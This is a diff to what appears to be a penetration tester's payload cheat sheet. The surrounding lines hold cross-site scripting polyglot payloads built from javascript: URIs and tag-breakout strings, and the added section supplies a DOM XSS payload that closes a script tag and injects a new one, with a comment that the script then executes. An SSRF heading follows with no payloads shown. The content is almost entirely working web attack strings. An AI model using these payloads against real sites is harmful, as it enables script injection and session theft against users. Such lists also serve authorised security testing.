@@ -76,6 +76,12 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
  
  javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
 
+DOM XSS
+-----------------------------
+""</script><script>alert('DOM XXS')</script>
+    --> DOM of the page is broken and the script is getting executed.
+    
+    
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 SSRF
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
